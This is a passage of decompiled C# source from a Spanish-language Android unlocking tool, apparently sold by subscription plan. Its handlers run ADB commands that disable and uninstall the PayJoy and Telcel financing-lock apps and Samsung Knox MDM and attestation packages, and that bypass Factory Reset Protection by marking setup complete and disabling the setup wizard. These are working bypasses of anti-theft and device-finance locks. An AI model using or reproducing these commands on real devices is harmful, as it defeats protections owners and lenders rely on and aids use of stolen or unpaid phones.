		private async void btnRemovePayNew_Click(object sender, EventArgs e)
		{
			await this.RemovePayNewAsync();
		}

		// Token: 0x0600006C RID: 108 RVA: 0x00004B60 File Offset: 0x00002D60
		private async void btnRemovePayOld_Click(object sender, EventArgs e)
		{
			await this.RemovePayOldAsync();
		}

		// Token: 0x0600006D RID: 109 RVA: 0x00004BA8 File Offset: 0x00002DA8
		private async Task RemovePayOldAsync()
		{
			Form1._Closure$__68-1 CS$<>8__locals1 = new Form1._Closure$__68-1(CS$<>8__locals1);
			CS$<>8__locals1.$VB$Me = this;
			bool flag = this.processRunning;
			if (flag)
			{
				this.LogOutput("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(3);
					this.UpdateProgressBar();
				}));
				CancellationTokenSource cts = new CancellationTokenSource();
				CS$<>8__locals1.$VB$Local_token = cts.Token;
				Task tareaProceso = Task.Run(delegate()
				{
					try
					{
						Form1._Closure$__68-0 CS$<>8__locals2 = new Form1._Closure$__68-0(CS$<>8__locals2);
						CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2 = CS$<>8__locals1;
						List<string> adbDevices = CS$<>8__locals1.$VB$Me.GetAdbDevices();
						bool flag2 = adbDevices.Count == 0;
						if (flag2)
						{
							CS$<>8__locals1.$VB$Me.LogOutput("❌ No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
						}
						else
						{
							CS$<>8__locals2.$VB$Local_selectedDevice = "";
							CS$<>8__locals1.$VB$Me.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								bool flag5 = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Me.cmbDevicesAdb.SelectedItem != null;
								if (flag5)
								{
									CS$<>8__locals2.$VB$Local_selectedDevice = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Me.cmbDevicesAdb.SelectedItem.ToString();
								}
							}));
							bool flag3 = string.IsNullOrWhiteSpace(CS$<>8__locals2.$VB$Local_selectedDevice);
							if (flag3)
							{
								CS$<>8__locals1.$VB$Me.LogOutput("❌ Por favor selecciona un dispositivo ADB.");
							}
							else
							{
								bool flag4 = CS$<>8__locals1.$VB$Me.cancelRequested | CS$<>8__locals1.$VB$Local_token.IsCancellationRequested;
								if (flag4)
								{
									CS$<>8__locals1.$VB$Me.LogOutput("⏹ Proceso cancelado antes de iniciar la desinstalación.");
								}
								else
								{
									CS$<>8__locals1.$VB$Me.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
									{
										CS$<>8__locals1.$VB$Me.txtOutput.Clear();
										CS$<>8__locals1.$VB$Me.txtOutput.AppendText("Iniciando proceso Remove MDM Pay Old..." + Environment.NewLine);
									}));
									string[] array = new string[]
									{
										"shell pm disable-user --user 0 com.payjoy.access",
										"shell pm disable com.payjoy.access",
										"shell pm uninstall -k --user 0 com.payjoy.access",
										"shell pm uninstall --user 0 com.payjoy.access"
									};
									foreach (string command in array)
									{
										CS$<>8__locals1.$VB$Me.ExecuteAdbCommand(command, CS$<>8__locals2.$VB$Local_selectedDevice);
									}
									CS$<>8__locals1.$VB$Me.UpdateProgressBar();
									CS$<>8__locals1.$VB$Me.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
									{
										CS$<>8__locals1.$VB$Me.txtOutput.AppendText("✅ Proceso terminado." + Environment.NewLine);
										CS$<>8__locals1.$VB$Me.txtOutput.AppendText("ℹ En caso de no funcionar es porque tiene nueva seguridad, intentar con PAY MDM BYPASS NEW." + Environment.NewLine);
										CS$<>8__locals1.$VB$Me.txtOutput.AppendText("Done..." + Environment.NewLine);
									}));
									CS$<>8__locals1.$VB$Me.UpdateProgressBar();
								}
							}
						}
					}
					catch (Exception ex)
					{
						CS$<>8__locals1.$VB$Me.LogOutput(string.Format("❗ Error durante el proceso: {0}", ex.Message));
					}
					finally
					{
						CS$<>8__locals1.$VB$Me.processRunning = false;
						CS$<>8__locals1.$VB$Me.AplicarPermisosDesdeFirebasePorPlan();
						CS$<>8__locals1.$VB$Me.btnCancelarProceso.Enabled = false;
					}
				}, CS$<>8__locals1.$VB$Local_token);
				Task tareaTimeout = Task.Delay(8000);
				await Task.WhenAny(new Task[]
				{
					tareaProceso,
					tareaTimeout
				});
				if (!tareaProceso.IsCompleted)
				{
					this.cancelRequested = true;
					this.LogOutput("⏰ Tiempo de espera agotado. El proceso fue cancelado automáticamente.");
				}
				this.processRunning = false;
				this.btnCancelarProceso.Enabled = false;
				this.AplicarPermisosDesdeFirebasePorPlan();
			}
		}

		// Token: 0x0600006E RID: 110 RVA: 0x00004BEC File Offset: 0x00002DEC
		private async Task RemoverFRPAsync()
		{
			bool flag = this.processRunning;
			if (flag)
			{
				this.LogOutput("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(4);
					this.UpdateProgressBar();
				}));
				CancellationTokenSource cts = new CancellationTokenSource();
				CancellationToken token = cts.Token;
				Task tareaProceso = Task.Run(delegate()
				{
					try
					{
						List<string> adbDevices = this.GetAdbDevices();
						bool flag2 = adbDevices.Count == 0;
						if (flag2)
						{
							this.LogOutput("❌ No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
						}
						else
						{
							string selectedDevice = "";
							this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								bool flag5 = this.cmbDevicesAdb.SelectedItem != null;
								if (flag5)
								{
									selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
								}
							}));
							bool flag3 = string.IsNullOrWhiteSpace(selectedDevice);
							if (flag3)
							{
								this.LogOutput("❌ Por favor selecciona un dispositivo ADB.");
							}
							else
							{
								bool flag4 = this.cancelRequested | token.IsCancellationRequested;
								if (flag4)
								{
									this.LogOutput("⏹ Proceso cancelado antes de remover FRP.");
								}
								else
								{
									this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
									{
										this.txtOutput.Clear();
										this.txtOutput.AppendText("Iniciando proceso Remove FRP NEW..." + Environment.NewLine);
									}));
									this.ExecuteAdbDevices();
									this.ExecuteAdbCommand("shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1", selectedDevice);
									this.ExecuteAdbCommand("shell pm disable-user --user 0 com.sec.android.app.setupwizard", selectedDevice);
									this.ExecuteAdbCommand("shell pm disable-user --user 0 com.sec.android.app.setupwizardlegalprovider", selectedDevice);
									this.ExecuteAdbCommand("shell pm disable-user --user 0 com.sec.android.app.SecSetupWizard", selectedDevice);
									this.UpdateProgressBar();
									this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
									{
										this.txtOutput.AppendText("Proceso terminado." + Environment.NewLine);
										this.txtOutput.AppendText("En caso de no funcionar INTENTAR NUEVAMENTE." + Environment.NewLine);
										this.txtOutput.AppendText("FRP Done..." + Environment.NewLine);
									}));
									this.UpdateProgressBar();
								}
							}
						}
					}
					catch (Exception ex)
					{
						this.LogOutput("❗ Error durante el proceso: " + ex.Message);
					}
					finally
					{
						this.processRunning = false;
						this.AplicarPermisosDesdeFirebasePorPlan();
						this.btnCancelarProceso.Enabled = false;
					}
				}, token);
				Task tareaTimeout = Task.Delay(7000);
				await Task.WhenAny(new Task[]
				{
					tareaProceso,
					tareaTimeout
				});
				if (!tareaProceso.IsCompleted)
				{
					this.cancelRequested = true;
					this.LogOutput("⏰ Tiempo de espera agotado. El proceso fue cancelado automáticamente.");
				}
				this.processRunning = false;
				this.btnCancelarProceso.Enabled = false;
				this.AplicarPermisosDesdeFirebasePorPlan();
			}
		}

		// Token: 0x0600006F RID: 111 RVA: 0x00004C30 File Offset: 0x00002E30
		private void btnMsjTelcelOld_Click(object sender, EventArgs e)
		{
			this.txtOutput.Clear();
			this.VerificarEntornoSeguro();
			this.InitializeProgressBar(2);
			try
			{
				List<string> adbDevices = this.GetAdbDevices();
				bool flag = adbDevices.Count == 0 || this.cmbDevicesAdb.SelectedItem == null;
				if (flag)
				{
					MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
				}
				else
				{
					string device = this.cmbDevicesAdb.SelectedItem.ToString();
					this.txtOutput.AppendText(" " + Environment.NewLine);
					this.txtOutput.AppendText("Iniciando proceso Remove MENSAJE TELCEL OLD..." + Environment.NewLine);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 co.sitic.pp", device);
					this.ExecuteAdbCommand("shell pm disable co.sitic.pp", device);
					this.ExecuteAdbCommand("shell pm uninstall -k --user 0 co.sitic.pp", device);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 co.sitic.pp", device);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.gameloft.android.gdc", device);
					this.ExecuteAdbCommand("shell pm disable com.gameloft.android.gdc", device);
					this.ExecuteAdbCommand("shell pm uninstall -k --user 0 com.gameloft.android.gdc", device);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.gameloft.android.gdc", device);
					this.ExecuteAdbCommand("shell pm disable-user --user 0 com.samsung.android.game.gamehome", device);
					this.ExecuteAdbCommand("shell pm disable com.samsung.android.game.gamehome", device);
					this.ExecuteAdbCommand("shell pm uninstall -k --user 0 com.samsung.android.game.gamehome", device);
					this.ExecuteAdbCommand("shell pm uninstall --user 0 com.samsung.android.game.gamehomec", device);
					this.UpdateProgressBar();
					this.txtOutput.AppendText("Proceso terminado." + Environment.NewLine);
					this.txtOutput.AppendText("En caso de no funcionar es porque tiene nueva seguridad, intentar con MENSAJE TELCEL NEW." + Environment.NewLine);
					this.UpdateProgressBar();
					this.txtOutput.AppendText("Done..." + Environment.NewLine);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(string.Format("Error durante MDM MENSAJE TELCEL OLD: {0}", ex.Message));
			}
			finally
			{
				this.processRunning = false;
				this.AplicarPermisosDesdeFirebasePorPlan();
				this.btnCancelarProceso.Enabled = false;
			}
		}

		// Token: 0x06000070 RID: 112 RVA: 0x00004E4C File Offset: 0x0000304C
		private async void btnMsjTelcelNew_Click(object sender, EventArgs e)
		{
			await this.RemoveMensajeTelcelNewAsync();
		}

		// Token: 0x06000071 RID: 113 RVA: 0x00004E94 File Offset: 0x00003094
		private async Task RemoveMensajeTelcelNewAsync()
		{
			Form1._Closure$__72-1 CS$<>8__locals1 = new Form1._Closure$__72-1(CS$<>8__locals1);
			CS$<>8__locals1.$VB$Me = this;
			bool flag = this.processRunning;
			if (flag)
			{
				this.LogOutput("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(3);
					this.UpdateProgressBar();
				}));
				CancellationTokenSource cts = new CancellationTokenSource();
				CS$<>8__locals1.$VB$Local_token = cts.Token;
				Task tareaProceso = Task.Run(delegate()
				{
					try
					{
						Form1._Closure$__72-0 CS$<>8__locals2 = new Form1._Closure$__72-0(CS$<>8__locals2);
						CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2 = CS$<>8__locals1;
						List<string> adbDevices = CS$<>8__locals1.$VB$Me.GetAdbDevices();
						bool flag2 = adbDevices.Count == 0;
						if (flag2)
						{
							CS$<>8__locals1.$VB$Me.LogOutput("❌ No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
						}
						else
						{
							CS$<>8__locals2.$VB$Local_selectedDevice = "";
							CS$<>8__locals1.$VB$Me.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								bool flag5 = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Me.cmbDevicesAdb.SelectedItem != null;
								if (flag5)
								{
									CS$<>8__locals2.$VB$Local_selectedDevice = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Me.cmbDevicesAdb.SelectedItem.ToString();
								}
							}));
							bool flag3 = string.IsNullOrWhiteSpace(CS$<>8__locals2.$VB$Local_selectedDevice);
							if (flag3)
							{
								CS$<>8__locals1.$VB$Me.LogOutput("❌ Por favor selecciona un dispositivo ADB.");
							}
							else
							{
								bool flag4 = CS$<>8__locals1.$VB$Me.cancelRequested | CS$<>8__locals1.$VB$Local_token.IsCancellationRequested;
								if (flag4)
								{
									CS$<>8__locals1.$VB$Me.LogOutput("⏹ Proceso cancelado antes de iniciar.");
								}
								else
								{
									CS$<>8__locals1.$VB$Me.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
									{
										CS$<>8__locals1.$VB$Me.txtOutput.Clear();
										CS$<>8__locals1.$VB$Me.txtOutput.AppendText("Iniciando proceso Remove MENSAJE TELCEL NEW..." + Environment.NewLine);
									}));
									string[] array = new string[]
									{
										"shell pm disable-user --user 0 co.sitic.pp",
										"shell pm disable co.sitic.pp",
										"shell pm uninstall -k --user 0 co.sitic.pp",
										"shell pm uninstall --user 0 co.sitic.pp",
										"shell pm disable-user --user 0 com.gameloft.android.gdc",
										"shell pm disable com.gameloft.android.gdc",
										"shell pm uninstall -k --user 0 com.gameloft.android.gdc",
										"shell pm uninstall --user 0 com.gameloft.android.gdc",
										"shell pm disable-user --user 0 com.samsung.android.game.gamehome",
										"shell pm disable com.samsung.android.game.gamehome",
										"shell pm uninstall -k --user 0 com.samsung.android.game.gamehome",
										"shell pm uninstall --user 0 com.samsung.android.game.gamehomec",
										"shell pm uninstall --user 0 com.samsung.android.game.gamehomec",
										"shell am crash co.sitic.pp",
										"shell pm suspend co.sitic.pp",
										"shell am kill co.sitic.pp",
										"shell am set-inactive co.sitic.pp",
										"shell pm uninstall --user 0 co.sitic.pp",
										"shell pm disable-user --user 0 co.sitic.pp"
									};
									foreach (string command in array)
									{
										CS$<>8__locals1.$VB$Me.ExecuteAdbCommand(command, CS$<>8__locals2.$VB$Local_selectedDevice);
									}
									CS$<>8__locals1.$VB$Me.UpdateProgressBar();
									CS$<>8__locals1.$VB$Me.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
									{
										CS$<>8__locals1.$VB$Me.txtOutput.AppendText("✅ Proceso terminado." + Environment.NewLine);
										CS$<>8__locals1.$VB$Me.txtOutput.AppendText("ℹ En caso de no funcionar, intenta con MENSAJE TELCEL FULL." + Environment.NewLine);
										CS$<>8__locals1.$VB$Me.txtOutput.AppendText("Done..." + Environment.NewLine);
									}));
									CS$<>8__locals1.$VB$Me.UpdateProgressBar();
								}
							}
						}
					}
					catch (Exception ex)
					{
						CS$<>8__locals1.$VB$Me.LogOutput(string.Format("❗ Error durante MENSAJE TELCEL NEW: {0}", ex.Message));
					}
					finally
					{
						CS$<>8__locals1.$VB$Me.processRunning = false;
						CS$<>8__locals1.$VB$Me.AplicarPermisosDesdeFirebasePorPlan();
						CS$<>8__locals1.$VB$Me.btnCancelarProceso.Enabled = false;
					}
				}, CS$<>8__locals1.$VB$Local_token);
				Task tareaTimeout = Task.Delay(9000);
				await Task.WhenAny(new Task[]
				{
					tareaProceso,
					tareaTimeout
				});
				if (!tareaProceso.IsCompleted)
				{
					this.cancelRequested = true;
					this.LogOutput("⏰ Tiempo de espera agotado. El proceso fue cancelado automáticamente.");
				}
				this.processRunning = false;
				this.btnCancelarProceso.Enabled = false;
				this.AplicarPermisosDesdeFirebasePorPlan();
			}
		}

		// Token: 0x06000072 RID: 114 RVA: 0x00004ED8 File Offset: 0x000030D8
		private void btnKnox_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(9);
					this.UpdateProgressBar();
				}));
				Task.Run(delegate()
				{
					try
					{
						Form1._Closure$__73-0 CS$<>8__locals1 = new Form1._Closure$__73-0(CS$<>8__locals1);
						CS$<>8__locals1.$VB$Me = this;
						List<string> adbDevices = this.GetAdbDevices();
						bool flag2 = adbDevices.Count == 0 || this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_1<object>(() => this.cmbDevicesAdb.SelectedItem)) == null;
						if (flag2)
						{
							MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
						}
						else
						{
							CS$<>8__locals1.$VB$Local_selectedDevice = "";
							this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								CS$<>8__locals1.$VB$Local_selectedDevice = CS$<>8__locals1.$VB$Me.cmbDevicesAdb.SelectedItem.ToString();
							}));
							this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								this.txtOutput.AppendText(Environment.NewLine + "Iniciando proceso Knox BYpass..." + Environment.NewLine);
							}));
							List<ValueTuple<string, List<string>>> list = new List<ValueTuple<string, List<string>>>
							{
								new ValueTuple<string, List<string>>("Paso 1", new List<string>
								{
									"shell pm disable-user com.sec.enterprise.knox.cloudmdm.smdms",
									"shell pm disable-user --user 0 com.sec.enterprise.knox.cloudmdm.smdms",
									"shell pm disable com.sec.enterprise.knox.cloudmdm.smdms",
									"shell pm uninstall -k --user 0 com.sec.enterprise.knox.cloudmdm.smdms",
									"shell pm uninstall --user 0 com.sec.enterprise.knox.cloudmdm.smdms"
								}),
								new ValueTuple<string, List<string>>("Paso 2", new List<string>
								{
									"shell pm disable-user com.samsung.android.knox.containercore",
									"shell pm disable-user --user 0 com.samsung.android.knox.containercore",
									"shell pm disable com.samsung.android.knox.containercore",
									"shell pm uninstall -k --user 0 com.samsung.android.knox.containercore",
									"shell pm uninstall --user 0 com.samsung.android.knox.containercore"
								}),
								new ValueTuple<string, List<string>>("Paso 3", new List<string>
								{
									"shell pm disable-user com.sec.enterprise.knox.attestation",
									"shell pm disable-user --user 0 com.sec.enterprise.knox.attestation",
									"shell pm disable com.sec.enterprise.knox.attestation",
									"shell pm uninstall -k --user 0 com.sec.enterprise.knox.attestation",
									"shell pm uninstall --user 0 com.sec.enterprise.knox.attestation"
								}),
								new ValueTuple<string, List<string>>("Paso 4", new List<string>
								{
									"shell pm disable-user com.samsung.android.knox.containeragent",
									"shell pm disable-user --user 0 com.samsung.android.knox.containeragent",
									"shell pm disable com.samsung.android.knox.containeragent",
									"shell pm uninstall -k --user 0 com.samsung.android.knox.containeragent",
									"shell pm uninstall --user 0 com.samsung.android.knox.containeragent"
								}),
								new ValueTuple<string, List<string>>("Paso 5", new List<string>
								{
									"shell pm disable-user com.samsung.knox.keychain",
									"shell pm disable-user --user 0 com.samsung.knox.keychain",
									"shell pm disable com.samsung.knox.keychain",
									"shell pm uninstall -k --user 0 com.samsung.knox.keychain",
									"shell pm uninstall --user 0 com.samsung.knox.keychain"
								}),
								new ValueTuple<string, List<string>>("Paso 6", new List<string>
								{
									"shell pm disable-user com.samsung.android.knox.analytics.uploader",
									"shell pm disable-user --user 0 com.samsung.android.knox.analytics.uploader",
									"shell pm disable com.samsung.android.knox.analytics.uploader",
									"shell pm uninstall -k --user 0 com.samsung.android.knox.analytics.uploader",
									"shell pm uninstall --user 0 com.samsung.android.knox.analytics.uploader"
								}),
								new ValueTuple<string, List<string>>("Paso 7", new List<string>
								{
									"shell pm disable-user com.knox.vpn.proxyhandler",
									"shell pm disable-user --user 0 com.knox.vpn.proxyhandler",
									"shell pm disable com.knox.vpn.proxyhandler",
									"shell pm uninstall -k --user 0 com.knox.vpn.proxyhandler",
									"shell pm uninstall --user 0 com.knox.vpn.proxyhandler"
								}),
								new ValueTuple<string, List<string>>("Paso 8", new List<string>
								{
									"shell pm disable-user com.sec.android.app.setupwizardlegalprovider",
									"shell pm disable-user --user 0 com.sec.android.app.setupwizardlegalprovider",
									"shell pm disable com.sec.android.app.setupwizardlegalprovider",
									"shell pm uninstall -k --user 0 com.sec.android.app.setupwizardlegalprovider",
									"shell pm uninstall --user 0 com.sec.android.app.setupwizardlegalprovider"
								}),
								new ValueTuple<string, List<string>>("Paso 9", new List<string>
								{
									"shell pm disable-user com.samsung.android.easysetup",
									"shell pm disable-user --user 0 com.samsung.android.easysetup",
									"shell pm disable com.samsung.android.easysetup",
									"shell pm uninstall -k --user 0 com.samsung.android.easysetup",
									"shell pm uninstall --user 0 com.samsung.android.easysetup"
								}),
								new ValueTuple<string, List<string>>("Paso 10", new List<string>
								{
									"shell pm disable-user com.google.android.partnersetup",
									"shell pm disable-user --user 0 com.google.android.partnersetup",
									"shell pm disable com.google.android.partnersetup",
									"shell pm uninstall -k --user 0 com.google.android.partnersetup",
									"shell pm uninstall --user 0 com.google.android.partnersetup",
									"shell pm disable-user com.sec.android.soagent",
									"shell pm disable-user --user 0 com.sec.android.soagent",
									"shell pm disable com.sec.android.soagent",
									"shell pm uninstall -k --user 0 com.sec.android.soagent",
									"shell pm uninstall --user 0 com.sec.android.soagent",
									"shell pm disable-user com.wssyncmldm",
									"shell pm uninstall --user 0 com.wssyncmldm",
									"shell pm uninstall -k --user 0 com.LocalFota",
									"shell pm uninstall -k --user 0 com.samsung.syncmlservice",
									"shell pm uninstall -k --user 0 com.sec.android.fotaclient",
									"shell pm uninstall -k --user 0 com.sec.android.fwupgrade",
									"shell pm uninstall -k --user 0 com.sprint.w.installer",
									"shell pm uninstall -k --user 0 com.sprint.zone",
									"shell pm uninstall -k --user 0 com.ws.dm",
									"shell pm uninstall -k --user 0 com.wssyncmldm",
									"shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1",
									"shell pm disable-user --user 0 com.sec.android.app.setupwizard",
									"shell pm disable-user --user 0 com.sec.android.app.setupwizardlegalprovider",
									"shell pm disable-user --user 0 com.sec.android.app.SecSetupWizard"
								})
							};
							try
							{
								List<ValueTuple<string, List<string>>>.Enumerator enumerator = list.GetEnumerator();
								while (enumerator.MoveNext())
								{
									Form1._Closure$__73-1 CS$<>8__locals2 = new Form1._Closure$__73-1(CS$<>8__locals2);
									CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2 = CS$<>8__locals1;
									CS$<>8__locals2.$VB$Local_paso = enumerator.Current;
									try
									{
										foreach (string command in CS$<>8__locals2.$VB$Local_paso.Item2)
										{
											this.ExecuteAdbCommand(command, CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_selectedDevice);
										}
									}
									finally
									{
										List<string>.Enumerator enumerator2;
										((IDisposable)enumerator2).Dispose();
									}
									this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
									{
										this.UpdateProgressBar();
									}));
									this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
									{
										CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Me.txtOutput.AppendText(CS$<>8__locals2.$VB$Local_paso.Item1 + " terminado." + Environment.NewLine);
									}));
								}
							}
							finally
							{
								List<ValueTuple<string, List<string>>>.Enumerator enumerator;
								((IDisposable)enumerator).Dispose();
							}
							this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								this.txtOutput.AppendText("✅ Proceso Knox BYpass finalizado." + Environment.NewLine);
								this.txtOutput.AppendText("ℹ️ En caso de no funcionar, probar Knox Full." + Environment.NewLine);
							}));
						}
					}
					catch (Exception ex)
					{
						MessageBox.Show(string.Format("❌ Error durante knox Bypass: {0}", ex.Message));
					}
					finally
					{
						this.processRunning = false;
						this.AplicarPermisosDesdeFirebasePorPlan();
						this.btnCancelarProceso.Enabled = false;
					}
				});
			}
		}

		// Token: 0x06000073 RID: 115 RVA: 0x00004F54 File Offset: 0x00003154
		private void ShowQRWindow(string qrImageUrl)
		{
			try
			{
				WebClient webClient = new WebClient();
				byte[] buffer = webClient.DownloadData(qrImageUrl);
				Image image;
				using (MemoryStream memoryStream = new MemoryStream(buffer))
				{
					image = Image.FromStream(memoryStream);
				}
				Form form = new Form
				{
					Text = "Escanear QR para Instrucciones",
					Size = new Size(300, 300),
					StartPosition = FormStartPosition.CenterScreen
				};
				PictureBox value = new PictureBox
				{
					Dock = DockStyle.Fill,
					SizeMode = PictureBoxSizeMode.Zoom,
					Image = image
				};
				form.Controls.Add(value);
				form.ShowDialog();
			}
			catch (Exception ex)
			{
				MessageBox.Show(string.Format("Error al cargar la imagen QR: {0}", ex.Message), "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x06000074 RID: 116 RVA: 0x00005044 File Offset: 0x00003244
		private void btnQRFRP_Click_(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(3);
					this.UpdateProgressBar();
				}));
				Task.Run(checked(delegate()
				{
					try
					{
						Form1._Closure$__75-1 CS$<>8__locals1 = new Form1._Closure$__75-1(CS$<>8__locals1);
						CS$<>8__locals1.$VB$Me = this;
						this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.txtOutput.Clear();
							this.txtOutput.AppendText("\ud83d\udcf7 Generando QR ADB... Espere..." + Environment.NewLine);
							this.txtOutput.AppendText("\ud83d\udcf1 Escanea el código QR. Luego, conecta el dispositivo. Cuando solicite depuración puedes cerrar el QR para continuar." + Environment.NewLine);
						}));
						base.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.ShowQRWindow("https://reparacionesdecelular.com/up/adbqr.png");
						}));
						this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.UpdateProgressBar();
						}));
						string value = "";
						CS$<>8__locals1.$VB$Local_maxAttempts = 6;
						Form1._Closure$__75-0 CS$<>8__locals2 = new Form1._Closure$__75-0(CS$<>8__locals2);
						CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2 = CS$<>8__locals1;
						Form1._Closure$__75-0 CS$<>8__locals3 = CS$<>8__locals2;
						int $VB$Local_maxAttempts = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_maxAttempts;
						CS$<>8__locals3.$VB$Local_i = 1;
						while (CS$<>8__locals2.$VB$Local_i <= $VB$Local_maxAttempts)
						{
							List<string> adbDevices = this.GetAdbDevices();
							bool flag2 = adbDevices.Count > 0;
							if (flag2)
							{
								value = adbDevices.First<string>();
								break;
							}
							this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Me.txtOutput.AppendText(string.Format("⌛ Esperando conexión ADB... intento {0} de {1}", CS$<>8__locals2.$VB$Local_i, CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_maxAttempts) + Environment.NewLine);
							}));
							Thread.Sleep(5000);
							CS$<>8__locals2.$VB$Local_i++;
						}
						bool flag3 = string.IsNullOrEmpty(value);
						if (flag3)
						{
							MessageBox.Show("❌ No se detectó un dispositivo ADB tras mostrar el QR.");
							return;
						}
						CS$<>8__locals1.$VB$Local_selectedDevice = "";
						this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							bool flag5 = CS$<>8__locals1.$VB$Me.cmbDevicesAdb.SelectedItem != null;
							if (flag5)
							{
								CS$<>8__locals1.$VB$Local_selectedDevice = CS$<>8__locals1.$VB$Me.cmbDevicesAdb.SelectedItem.ToString();
							}
						}));
						bool flag4 = string.IsNullOrEmpty(CS$<>8__locals1.$VB$Local_selectedDevice);
						if (flag4)
						{
							MessageBox.Show("❌ No se ha seleccionado ningún dispositivo en la lista ADB.");
							return;
						}
						this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.UpdateProgressBar();
						}));
						this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.txtOutput.AppendText("\ud83d\ude80 Iniciando proceso Knox..." + Environment.NewLine);
						}));
						this.LeerInformacionAdb(CS$<>8__locals1.$VB$Local_selectedDevice);
						this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.UpdateProgressBar();
						}));
						this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							this.txtOutput.AppendText("✅ Proceso finalizado." + Environment.NewLine);
						}));
					}
					catch (Exception ex)
					{
						MessageBox.Show("❌ Error durante QR FRP: " + ex.Message);
					}
					finally
					{
						this.processRunning = false;
						this.AplicarPermisosDesdeFirebasePorPlan();
						this.btnCancelarProceso.Enabled = false;
					}
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				}));
				this.processRunning = false;
				this.btnCancelarProceso.Enabled = false;
				this.AplicarPermisosDesdeFirebasePorPlan();
			}
		}

		// Token: 0x06000075 RID: 117 RVA: 0x000050DC File Offset: 0x000032DC
		private void ExecuteKnox(string selectedDevice, int totalSteps)
		{
			try
			{
				this.InitializeProgressBar(totalSteps);
				this.txtOutput.AppendText(" " + Environment.NewLine);
